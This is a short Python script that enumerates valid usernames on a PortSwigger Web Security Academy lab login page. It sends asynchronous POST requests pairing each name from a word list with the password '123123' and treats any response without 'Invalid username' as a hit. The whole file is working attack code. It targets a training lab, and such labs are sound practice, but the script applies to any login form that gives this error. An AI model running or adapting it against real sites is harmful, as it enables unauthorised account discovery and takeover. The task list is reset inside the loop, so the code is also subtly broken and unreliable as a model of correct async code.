import asyncio
import aiohttp

URL = "https://ac071fd81fb75cd2c0dc4cfb00b00084.web-security-academy.net/login"

users_file = open('users_portswigger.txt', 'r')
users_list = users_file.readlines()
users_file.close()
credentials = []

for user in users_list:
    credentials.append({'username': user.strip(), 'password': '123123'})


async def fetch(session, url, body_req):
    async with session.post(url, data=body_req) as response:
        html = await response.text()

        if 'Invalid username' in html:
            print(f"fail: {body_req}")
        else:
            print(f"success: {body_req}")


async def main():
    async with aiohttp.ClientSession() as session:
        for credential in credentials:
            tasks = []
            tasks.append(asyncio.ensure_future(fetch(session, URL, credential)))

        await asyncio.gather(*tasks)


asyncio.run(main())
